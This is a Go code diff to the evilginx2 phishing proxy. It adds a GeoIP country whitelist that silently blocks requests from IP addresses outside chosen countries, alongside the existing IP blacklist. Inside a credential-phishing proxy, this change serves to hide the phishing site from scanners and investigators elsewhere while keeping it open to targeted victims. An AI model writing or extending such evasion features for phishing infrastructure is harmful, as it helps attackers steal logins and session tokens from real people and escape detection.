@@ -35,6 +35,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 	"github.com/mwitkow/go-http-dialer"
+  	geoip2 "github.com/oschwald/geoip2-golang"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -61,6 +62,8 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	wl                *Whitelist
+	geoip_db          *geoip2.Reader
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -81,7 +84,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, geoip_db *geoip2.Reader, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -89,6 +92,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		wl:                wl,
+		geoip_db:          geoip_db,
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -146,6 +151,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			if p.bl.IsBlacklisted(from_ip) {
 				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+				return p.blockRequest(req)
+			}
+			if !p.wl.IsIPFromWhitelistedCountry(from_ip, geoip_db) {
+				log.Warning("country whitelist: request from ip address '%s' was blocked", from_ip)
 				return p.blockRequest(req)
 			}
 			if p.cfg.GetBlacklistMode() == "all" {
